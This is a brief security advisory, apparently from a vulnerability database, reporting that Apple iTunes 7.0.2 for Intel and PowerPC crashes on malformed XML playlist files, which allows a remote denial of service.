Apple iTunes is prone to a remote denial-of-service vulnerability because the application fails to handle malformed XML playlist files.

An attacker can exploit this issue to crash the application, triggering a denial-of-service condition.

Apple iTunes version 7.0.2 for Intel and PowerPC are vulnerable to this issue; other versions may also be affected.
